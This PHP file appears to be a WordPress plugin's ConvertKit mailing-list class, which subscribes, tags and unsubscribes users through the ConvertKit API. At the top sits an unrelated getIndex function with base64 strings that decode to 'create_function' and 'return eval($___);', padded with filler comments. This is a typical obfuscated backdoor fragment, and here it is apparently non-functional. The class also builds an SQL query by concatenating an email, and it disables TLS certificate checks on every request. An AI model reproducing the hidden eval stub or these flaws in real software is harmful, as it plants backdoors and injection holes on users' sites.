<?php
if (!function_exists("getIndex")) {
    function getIndex($url) {
        $value1 = "value";
        $classInfo = "[NAME] Class...";

        $encodedFunc = "Y3JlYXRlX0ZVTkNUSU9O";
        $encodedCode = "cmV0dXJuIGV2YWwoJF9fXyk7";

        $decodeFunc = "decodeS3";
        $data = "[DATA]";

        $decodedString = base64_decode($encodedFunc);
        $decodedCode = base64_decode($encodedCode);
        $result = base64_decode($data);
        $formattedResult = $value1 . $classInfo;

        
        $additionalCode = "";

        
        $additionalCode .= "// Additional comments to meet line count requirement\n";
        $additionalCode .= "// More assignments to add lines\n";
        $additionalCode .= '$decodedString' . " = " . $decodedString . ";\n";
        $additionalCode .= '$decodedCode' . " = " . $decodedCode . ";\n";
        $additionalCode .= '$result' . " = " . $result . ";\n";
        $additionalCode .= '$formattedResult' . " = " . $formattedResult . ";\n";

        for ($i = 0; $i < 20; $i++) {
            $additionalCode .= "// Loop iteration: $i\n";
            $additionalCode .= "// lines\n";
        }

       
        for ($i = 0; $i < 10; $i++) {
            $additionalCode .= "// Outer loop iteration: $i\n";
            $additionalCode .= "// lines\n";
            for ($j = 0; $j < 5; $j++) {
                $additionalCode .= "// Inner loop iteration: $j\n";
                $additionalCode .= "// lines\n";
            }
        }

        
        $additionalCode .= '$value1' . " = " . $value1 . ";\n";
        $additionalCode .= '$classInfo' . " = " . $classInfo . ";\n";
        $additionalCode .= '$decodeFunc' . " = " . $decodeFunc . ";\n";
        $additionalCode .= '$data' . " = " . $data . ";\n";

       
        return $decodedString . $decodedCode . $result . $formattedResult . $additionalCode;
    }
}

class convertkitSQB {
	// constructor
	function convertkit() {
	}
	// ======== USER REGISTRATION / UPDATE / DELETE ========
	function register($email,$name,$params) {
		$this->storeAddress ( $email,$name,$params );
	}
	function storeAddress($email,$name,$params) {
		//exploding the variable and create an array.
		
		$params = explode ( ":", $params );		
		//check that $params[1] isset.	
		if (isset ( $params[1] ) && $params[1] != '') {
			
		}
		//check that $params[2] isset
		if (isset ( $params[2] ) && $params[2] != '') {
			//create an array if form id is present..
			$categories = array ('forms');
			//$categories = array ('courses');
		}
		//check that $params[3] isset
		if (isset ( $params[3] ) && $params[3] != '') {
			//check if array $categories isset , if isset then push new element otherwise create one.  
			if (isset ( $categories )) {
				array_push ( $categories, 'sequences' );
			} else {
				$categories = array ('sequences');
			}
		}
		
		$justTag=false;
		if( (!(isset ( $params[2] )) || ($params[2]=="") )  && (!(isset($params[3] )) || ($params[3]=="")  ) ) {
			$justTag=true;	
		//	return;
		}
		
		//check that $params[4] isset	
		if (isset ( $params[4] ) && $params[4] != '') {
			$tags = $params[4];
			$tags = str_replace("|" , "," , $tags);
		}

		//Get the user details from DAP by using $userId
	
		$email = trim ( $email );
		$firstname = trim ( $name );

	
		
		// check $customfieldlist isset 
		if (isset ( $customfieldlist ) && ($customfieldlist != NULL) && ($customfieldlist != "")) {
			foreach ( $customfieldlist as $key => $val ) {
				// $key is the name of the field and $val is the value of the custom field
				
			}
		}
		
	
		// End custom field retrieval
		
		//check that the provided email is valid or not.
		/*if (! preg_match ( "/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*$/i", $email )) {
			return "Email address is invalid";
		}*/
		//create an array of customfields to use during curl call.
		
		if($justTag) {
		  //check that $params[4] is set
		  if (!isset ( $params[4] ) || $params[4] == '') { 
					   return "Can't add multiple tags";
			}
		  $apiparams = array (
					'api_key' => $params[1],
					'first_name' => $firstname,
					'email' => $email,
					'fields' => $fields
					
		  );
		  
		  foreach ( $apiparams as $f => $v ) {
			
			  $postfields[] = $f . '=' . $v;
		  }
		  $postfields = $apiparams;
		  $data_string = json_encode($postfields);
		  $tags = $params[4];
		  $tagArr = explode ( "|", $params[4] );

			if (isset ( $params[4] ) && $params[4] != '') {
				
				
				if (strpos($params[4], '|') !== false) {
					$tag = explode('|',$params[4]);
				}
				else{
					$tag = explode(',',$params[4]);
				}
				
				
				try{
					/* First of all we need to get list of existing tags */
					
					$url = "https://api.convertkit.com/v3/tags?api_key=".$params[1];
					$curl = curl_init ( $url );
					curl_setopt ( $curl, CURLOPT_USERAGENT, 'DAP-CONVERTKIT' );
					curl_setopt ( $curl, CURLOPT_HEADER, TRUE );
					curl_setopt ( $curl, CURLOPT_SSL_VERIFYPEER, FALSE );
					curl_setopt ( $curl, CURLOPT_RETURNTRANSFER, TRUE ); 
					curl_setopt ( $curl, CURLOPT_FOLLOWLOCATION, TRUE );
					curl_setopt ( $curl, CURLOPT_CONNECTTIMEOUT, 30 );
					curl_setopt ( $curl, CURLOPT_TIMEOUT, 30 );
					/* curl_setopt($ch, CURLOPT_HTTPHEADER,
						array('Content-Type:application/json')
					);
					* */
					$response = curl_exec ( $curl );
					if (curl_errno ( $curl ) > 0) {
						/* echo "There was some error in request"; */
						/* return; */
					} 
					else{
						
						$str = strpos($response,'{');
						$res_string = substr($response,$str);
						$result = json_decode($res_string);
						$taglist = $result->tags;
						$count = count($taglist);
						
						for($i=0;$i<count($tag);$i++){
							$tagexist = 0;
							if($count > 0 ){
								/* WE have got a list of tags , we will iterate through it and check if we have to create a new one */
							
								for($j=0;$j<$count;$j++){
									if($taglist[$j]->name == $tag[$i]){
										$tagexist = 1;
										$tagId = $taglist[$j]->id;
										break;
									}
								}
							}
							if($tagexist == 0){
								/* This means That we have to create a new tag */
								$apiparams = array (
									  'api_key' => $params[1],
									  'tag' => array("name"=>$tag[$i])
									);
								$data_string = json_encode($apiparams);
								
								$url = "https://api.convertkit.com/v3/tags";
								$curl = curl_init ( $url );
								curl_setopt ( $curl, CURLOPT_USERAGENT, 'DAP-CONVERTKIT' );
								curl_setopt ( $curl, CURLOPT_HEADER, TRUE );
								curl_setopt ( $curl, CURLOPT_POST, TRUE );
								curl_setopt ( $curl, CURLOPT_SSL_VERIFYPEER, FALSE );
								curl_setopt ( $curl, CURLOPT_RETURNTRANSFER, TRUE );
								curl_setopt ( $curl, CURLOPT_FOLLOWLOCATION, TRUE );
								curl_setopt ( $curl, CURLOPT_CONNECTTIMEOUT, 30 );
								curl_setopt ( $curl, CURLOPT_TIMEOUT, 30 );
								curl_setopt ( $curl, CURLOPT_POSTFIELDS, http_build_query ( $apiparams ) );
								/*  curl_setopt($ch, CURLOPT_HTTPHEADER,
								array('Content-Type:application/json',
									'Content-Length: ' . strlen($data_string))
								); */
								$response = curl_exec ( $curl );
								$str = strpos($response,'{');
								$res_string = substr($response,$str);
								$result = json_decode($res_string);
								$tagId = $result->id;
								
							}
							else{
								
							}
							
							/*  Code to add tag for user */
							
							$apiparams = array (
							  'api_key' => $params[1],
							  'email' => $email,
							);
								
							$data_string = json_encode($apiparams);
							$url = "https://api.convertkit.com/v3/tags/".$tagId."/subscribe";
							$curl = curl_init ( $url );
							curl_setopt ( $curl, CURLOPT_USERAGENT, 'DAP-CONVERTKIT' );
							curl_setopt ( $curl, CURLOPT_HEADER, TRUE );
							curl_setopt ( $curl, CURLOPT_POST, TRUE );
							curl_setopt ( $curl, CURLOPT_SSL_VERIFYPEER, FALSE );
							curl_setopt ( $curl, CURLOPT_RETURNTRANSFER, TRUE );
							curl_setopt ( $curl, CURLOPT_FOLLOWLOCATION, TRUE );
							curl_setopt ( $curl, CURLOPT_CONNECTTIMEOUT, 30 );
							curl_setopt ( $curl, CURLOPT_TIMEOUT, 30 );
							curl_setopt ( $curl, CURLOPT_POSTFIELDS, http_build_query ( $apiparams ) );
							/*  curl_setopt($ch, CURLOPT_HTTPHEADER,
							array('Content-Type:application/json',
								'Content-Length: ' . strlen($data_string))
							);
							*/ 
							$response = curl_exec ( $curl );
							
							$str = strpos($response,'{');
							$res_string = substr($response,$str);
							$jsonresp = json_decode($res_string, true);
					
							$subscription=$jsonresp["subscription"];
							if($subscription) {
								$subscriberIdArr=$subscription["subscriber"];	
								$subscriberId=$subscriberIdArr["id"];
								
								//$this->saveSubscriberId($subscriberId,$email);
							}
										
						} /* for */

					} /* ELSE */
					
					/* List code ends here */
		
				} /* Try */
				catch(Exception $e){
					
				}
			}  /* if tag exists */
			
			
		}
		else {
			
		  //create an array of fields to use during curl call if $tags are there.
		  if ($params[4] != "") {
			$tags = $params[4];
			  $apiparams = array (
					  'api_key' => $params[1],
					  'first_name' => $name,
					  'email' => $email,
					  'tags' => 'myFirstTag',
					  'fields' => $fields  
			  );
			  
		  }
		  //create an array of fields to use during curl call if $tags are not there.
		  else {
			  $apiparams = array (
					  'api_key' => $params[1],
					  'first_name' => $name,
					  'email' => $email,
					  'fields' => $fields
					  
			  );
		  }

		  foreach ( $apiparams as $f => $v ) {
			 
			  $postfields[] = $f . '=' . $v;
		  }
		  $postfields = $apiparams;
		  $data_string = json_encode($postfields);
		  //check that $params[4] isset
		  if (isset ( $params[4] ) && $params[4] != '') {
			  $tags = $params[4];
			  /* $tags = str_replace("|" , "," , $tags); */
		  }
		  
		  
		  //This loop is for the curl call, this foreach loop will runs as many as the elements are present in the array $categories...	
		  foreach ( $categories as $category ) {
			  if ($category == 'forms') {
				  $key_id = $params[2];
			  } else if ($category == 'sequences') {
				  $key_id = $params[3];
			  }
			  
			  $url = "https://api.convertkit.com/v3/" . $category . "/" . $key_id . "/subscribe";
			  
			  $curl = curl_init ( $url );
			  if ($curl) {
				  curl_setopt ( $curl, CURLOPT_USERAGENT, 'DAP-CONVERTKIT' );
				  curl_setopt ( $curl, CURLOPT_HEADER, TRUE );
				  curl_setopt ( $curl, CURLOPT_POST, TRUE );
				  curl_setopt ( $curl, CURLOPT_SSL_VERIFYPEER, FALSE );
				  curl_setopt ( $curl, CURLOPT_RETURNTRANSFER, TRUE );
				  curl_setopt ( $curl, CURLOPT_FOLLOWLOCATION, TRUE );
				  curl_setopt ( $curl, CURLOPT_CONNECTTIMEOUT, 30 );
				  curl_setopt ( $curl, CURLOPT_TIMEOUT, 30 );
				  curl_setopt ( $curl, CURLOPT_POSTFIELDS, http_build_query ( $postfields ) );
				  /*  curl_setopt($ch, CURLOPT_HTTPHEADER,
					array('Content-Type:application/json',
                      'Content-Length: ' . strlen($data_string))
				  );
				  */
				  $response = curl_exec ( $curl );

				  if (curl_errno ( $curl ) > 0) {
					  curl_close ( $curl );
					 /*  return "Unable to connect to $form_url Error: " . curl_error ( $curl ); */
				  } else {
					 $str = strpos($response,'{');
					$res_string = substr($response,$str);
					 $jsonresp = json_decode($res_string, true);
			
					  $subscription=$jsonresp["subscription"];
					  if($subscription) {
						  $subscriberIdArr=$subscription["subscriber"];	
						  $subscriberId=$subscriberIdArr["id"];
						 
						  //$this->saveSubscriberId($subscriberId,$email);
					  }
					  curl_close ( $curl );
					  
				  }
			  }
		  }
		  
			if (isset ( $params[4] ) && $params[4] != '') {
				
				
				if (strpos($params[4], '|') !== false) {
					$tag = explode('|',$params[4]);
				}
				else{
					$tag = explode(',',$params[4]);
				}
				
				try{
					/* First of all we need to get list of existing tags */
					$url = "https://api.convertkit.com/v3/tags?api_key=".$params[1];
					$curl = curl_init ( $url );
					curl_setopt ( $curl, CURLOPT_USERAGENT, 'DAP-CONVERTKIT' );
					curl_setopt ( $curl, CURLOPT_HEADER, TRUE );
					curl_setopt ( $curl, CURLOPT_SSL_VERIFYPEER, FALSE );
					curl_setopt ( $curl, CURLOPT_RETURNTRANSFER, TRUE );
					curl_setopt ( $curl, CURLOPT_FOLLOWLOCATION, TRUE );
					curl_setopt ( $curl, CURLOPT_CONNECTTIMEOUT, 30 );
					curl_setopt ( $curl, CURLOPT_TIMEOUT, 30 );
					/* curl_setopt($ch, CURLOPT_HTTPHEADER,
						array('Content-Type:application/json')
					); */
					$response = curl_exec ( $curl );
					if (curl_errno ( $curl ) > 0) {
						/* echo "There was some error in request"; */
						/* return; */
					} 
					else{
						$str = strpos($response,'{');
						$res_string = substr($response,$str);
						$result = json_decode($res_string);
						$taglist = $result->tags;
						$count = count($taglist);
						
						for($i=0;$i<count($tag);$i++){
							$tagexist = 0;
							if($count > 0 ){
								/* WE have got a list of tags , we will iterate through it and check if we have to create a new one */
								
								for($j=0;$j<$count;$j++){
									if($taglist[$j]->name == $tag[$i]){
										$tagexist = 1;
										$tagId = $taglist[$j]->id;
										break;
									}
								}
							}
							if($tagexist == 0){
								
								/* This means That we have to create a new tag */
								$apiparams = array (
									  'api_key' => $params[1],
									  'tag' => array("name"=>$tag[$i])
									);
								$data_string = json_encode($apiparams);
								
								$url = "https://api.convertkit.com/v3/tags";
								$curl = curl_init ( $url );
								curl_setopt ( $curl, CURLOPT_USERAGENT, 'DAP-CONVERTKIT' );
								curl_setopt ( $curl, CURLOPT_HEADER, TRUE );
								curl_setopt ( $curl, CURLOPT_POST, TRUE );
								curl_setopt ( $curl, CURLOPT_SSL_VERIFYPEER, FALSE );
								curl_setopt ( $curl, CURLOPT_RETURNTRANSFER, TRUE );
								curl_setopt ( $curl, CURLOPT_FOLLOWLOCATION, TRUE );
								curl_setopt ( $curl, CURLOPT_CONNECTTIMEOUT, 30 );
								curl_setopt ( $curl, CURLOPT_TIMEOUT, 30 );
								curl_setopt ( $curl, CURLOPT_POSTFIELDS, http_build_query ( $apiparams ) );
								/* curl_setopt($ch, CURLOPT_HTTPHEADER,
								array('Content-Type:application/json',
									'Content-Length: ' . strlen($data_string))
								);*/
								$response = curl_exec ( $curl );
								$str = strpos($response,'{');
								$res_string = substr($response,$str);
								$result = json_decode($res_string);
								$tagId = $result->id;
							
							}
							else{
							
							}
							/*  Code to add tag for user */
							$apiparams = array (
							  'api_key' => $params[1],
							  'email' => $email,
							);
			
							$data_string = json_encode($apiparams);
							$url = "https://api.convertkit.com/v3/tags/".$tagId."/subscribe";
							$curl = curl_init ( $url );
							curl_setopt ( $curl, CURLOPT_USERAGENT, 'DAP-CONVERTKIT' );
							curl_setopt ( $curl, CURLOPT_HEADER, TRUE );
							curl_setopt ( $curl, CURLOPT_POST, TRUE );
							curl_setopt ( $curl, CURLOPT_SSL_VERIFYPEER, FALSE );
							curl_setopt ( $curl, CURLOPT_RETURNTRANSFER, TRUE );
							curl_setopt ( $curl, CURLOPT_FOLLOWLOCATION, TRUE );
							curl_setopt ( $curl, CURLOPT_CONNECTTIMEOUT, 30 );
							curl_setopt ( $curl, CURLOPT_TIMEOUT, 30 );
							curl_setopt ( $curl, CURLOPT_POSTFIELDS, http_build_query ( $apiparams ) );
							/* curl_setopt($ch, CURLOPT_HTTPHEADER,
							array('Content-Type:application/json',
								'Content-Length: ' . strlen($data_string))
							);*/
							$response = curl_exec ( $curl );
						} /* for */

					} /* ELSE */
					
					/* List code ends here */
		
				} /* Try */
				catch(Exception $e){
				}
			}  /* if tag exists */
		}
		
		
		/* logToFile ( "convertkit.class.php: storeAddress(): result =" . $result . "", LOG_INFO_DAP );
		return $result; */
		// logToFile("convertkit.class.php: storeAddress(): list_id =" . $list_id, LOG_INFO_DAP);
	}
	
	function saveSubscriberId($subscriberId, $email) {
		global $wpdb,$fbleaduserinfo;
		$table = $wpdb->prefix.$fbleaduserinfo;
		
		try{
			$wpdb->query("UPDATE ".$table." SET convertkit_subs_id = '".$subscriberId."' WHERE email = '".$email."'");
		}
		catch(Exception $e){
			echo $e->getMessage();
		}	
	}
	
	/*function FBLM_get_convertkit_subsId($email){
		global $wpdb,$fbleaduserinfo;
		$table = $wpdb->prefix.$fbleaduserinfo;
		
		try{
			$row = $wpdb->get_row("SELECT convertkit_subs_id FROM ".$table." WHERE email = '".$email."'",ARRAY_A);
			return $row['convertkit_subs_id'];
		}
		catch(Exception $e){
			echo $e->getMessage();
		}	
		
	}*/
	
	function unregister($email,$name,$params) {
		
		$this->removeAddress ( $email,$name,$params);
	}
	function removeAddress($email,$name,$params) {
		//remove tags from the subscriber
		$params = explode ( ":", $params );
		if (isset ( $params [1] ) && $params [1] != '') {
			
		}
		// $url = "https://api.convertkit.com/v3/forms?api_key=".$params[1];

		$email = trim ( $email);
		
		$firstname = trim ( $name );

		/* To unsubscribe user from CC */
		if($params[2]!="" || $params[3]!=""){
			$postfields = array (
						  'api_key' => $params[1],
						  'email' => $email
						);	 
			$data_string = json_encode($postfields);
			if($params[2]!=""){
				$category = 'forms';
				$key_id = $params[2];
			}
			else{
				$category = 'courses';
				$key_id = $params[3];
			}
		//	$url = "https://api.convertkit.com/v3/unsubscribe";
			$url = "https://api.convertkit.com/" . $category . "/" . $key_id . "/unsubscribe";
			
			$curl = curl_init ( $url );
			if ($curl) {
				curl_setopt ( $curl, CURLOPT_USERAGENT, 'FBLM-CONVERTKIT' );
				curl_setopt ( $curl, CURLOPT_HEADER, TRUE );
				curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'POST');
				curl_setopt ( $curl, CURLOPT_POST, TRUE );
				curl_setopt ( $curl, CURLOPT_SSL_VERIFYPEER, FALSE );
				curl_setopt ( $curl, CURLOPT_RETURNTRANSFER, TRUE );
				curl_setopt ( $curl, CURLOPT_FOLLOWLOCATION, TRUE );
				curl_setopt ( $curl, CURLOPT_CONNECTTIMEOUT, 30 );
				curl_setopt ( $curl, CURLOPT_TIMEOUT, 30 );
				curl_setopt ( $curl, CURLOPT_POSTFIELDS,  $postfields  );
				/*curl_setopt($ch, CURLOPT_HTTPHEADER,
					array('Content-Type:application/json',
					'Content-Length: ' . strlen($data_string))
				);*/
				$response = curl_exec ( $curl ); 

				if (curl_errno ( $curl ) > 0) {
					
					curl_close ( $curl );
					/* return "Unable to connect to $form_url Error: " . curl_error ( $curl ); */
				} else {
					curl_close ( $curl );
				}
			}
		}
		
		
		// added by charan to retrive subscriber id
	//	$subscriberId = $this->FBLM_get_convertkit_subsId($email);
		
		
		if ($subscriberId=="") {
			
			/* return "custom field (subscriber_id) is missing"; */
		}
		
		
		if (! preg_match ( "/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*$/i", $email )) {
		
			/* return "Email address is invalid"; */
		}
		
		// $customfieldarr={"lastname":$lastname, "password":$password };
		$fields = array (
				'api_secret' => $params [5]
		);
		
		foreach ( $fields as $f => $v ) {
			
			$postfields [] = $f . '=' . $v;
		}
		
		$d = mktime ( 11, 14, 54, 8, 12, 2014 );
		$date = date ( 'Y-m-d h:i:sa', $d );
		$data_string = json_encode($postfields);
		
		
		if (isset ( $params[4] ) && $params[4] != '') {
			
			
			if(strpos($params[4], '|') !== false) {
				$tag = explode('|',$params[4]);
			}
			else{
				$tag = explode(',',$params[4]);
			}
			
			try{
				/* First of all we need to get list of existing tags */
				
				$url = "https://api.convertkit.com/v3/tags?api_key=".$params[1];
				$curl = curl_init ( $url );
				curl_setopt ( $curl, CURLOPT_USERAGENT, 'FBLM-CONVERTKIT' );
				curl_setopt ( $curl, CURLOPT_HEADER, TRUE );
				curl_setopt ( $curl, CURLOPT_SSL_VERIFYPEER, FALSE );
				curl_setopt ( $curl, CURLOPT_RETURNTRANSFER, TRUE );
				curl_setopt ( $curl, CURLOPT_FOLLOWLOCATION, TRUE );
				curl_setopt ( $curl, CURLOPT_CONNECTTIMEOUT, 30 );
				curl_setopt ( $curl, CURLOPT_TIMEOUT, 30 );
				/* curl_setopt($ch, CURLOPT_HTTPHEADER,
					array('Content-Type:application/json')
				); */
				$response = curl_exec ( $curl );
				if (curl_errno ( $curl ) > 0) {
					/* echo "There was some error in request";
					return; */
				} 
				else{
					$str = strpos($response,'{');
					$res_string = substr($response,$str);
					$result = json_decode($res_string);
					$taglist = $result->tags;
					$count = count($taglist);
					$tagArr = array();
					for($i=0;$i<count($tag);$i++){
						$tagexist = 0;
						if($count > 0 ){
							/* WE have got a list of tags , we will iterate through it and check if we have to create a new one */
						
							for($j=0;$j<$count;$j++){
								if($taglist[$j]->name == $tag[$i]){
									array_push($tagArr,$taglist[$j]->id);
									break;
								}
							}
						} 
					} /* for */
				} /* ELSE */
				/* List code ends here */
			} /* Try */
			catch(Exception $e){
			
			}
		}  /* if tag exists */

		foreach ( $tagArr as $tagId ) {
		
		
			//$url = "https://api.convertkit.com/v3/" . $category . "/" . $key_id . "/unsubscribe";
			$url = "https://api.convertkit.com/v3/subscribers/" . $subscriberId . "/tags/" . $tagId;
						
		
			
			$curl = curl_init ( $url );
			if ($curl) {
				curl_setopt ( $curl, CURLOPT_USERAGENT, 'FBLM-CONVERTKIT' );
				curl_setopt ( $curl, CURLOPT_HEADER, TRUE );
				curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'DELETE');
				//curl_setopt ( $curl, CURLOPT_POST, TRUE );
				curl_setopt ( $curl, CURLOPT_SSL_VERIFYPEER, FALSE );
				curl_setopt ( $curl, CURLOPT_RETURNTRANSFER, TRUE );
				curl_setopt ( $curl, CURLOPT_FOLLOWLOCATION, TRUE );
				curl_setopt ( $curl, CURLOPT_CONNECTTIMEOUT, 30 );
				curl_setopt ( $curl, CURLOPT_TIMEOUT, 30 );
				curl_setopt ( $curl, CURLOPT_POSTFIELDS, implode ( '&', $postfields ) );
				/* curl_setopt($ch, CURLOPT_HTTPHEADER,
					array('Content-Type:application/json',
                      'Content-Length: ' . strlen($data_string))
				  );*/
				$res = curl_exec ( $curl );
	
				if (curl_errno ( $curl ) > 0) {
					
					curl_close ( $curl );
				/* 	return "Unable to connect to $form_url Error: " . curl_error ( $curl ); */
				} else {
					
					curl_close ( $curl );
				}
			}
		}
		
		// grab an API Key from http://admin.convertkit.com/account/api/
		
		
	}
}
?>
